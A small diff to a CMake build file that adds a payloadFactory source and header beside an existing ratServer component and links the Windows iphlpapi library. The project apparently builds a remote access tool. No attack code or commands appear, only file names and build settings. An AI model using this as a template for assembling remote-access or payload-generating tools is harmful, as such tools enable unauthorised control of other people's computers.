@@ -23,6 +23,8 @@ SET(PROGRAM_SRC
     ${DIZIN_SRC}/sockets/csockManuel.cpp
     
     ${DIZIN_SRC}/rat/ratServer.cpp
+    ${DIZIN_SRC}/rat/payloadFactory.cpp
+
     ${DIZIN_SRC}/utils/systemAccess.cpp
 
 )
@@ -33,6 +35,8 @@ SET(PROGRAM_INCLUDE
     ${DIZIN_INCLUDE}/csock.hpp
     ${DIZIN_INCLUDE}/csockManuel.hpp
     
+    ${DIZIN_INCLUDE}/payloadFactory.hpp
+
     ${DIZIN_INCLUDE}/ratServer.hpp
     ${DIZIN_INCLUDE}/temDefines.hpp
 )
@@ -49,6 +53,7 @@ if(WIN32)
     target_link_libraries(
         ${PROJECT_NAME}
         ws2_32
+        iphlpapi
     )
 
 elseif(UNIX)
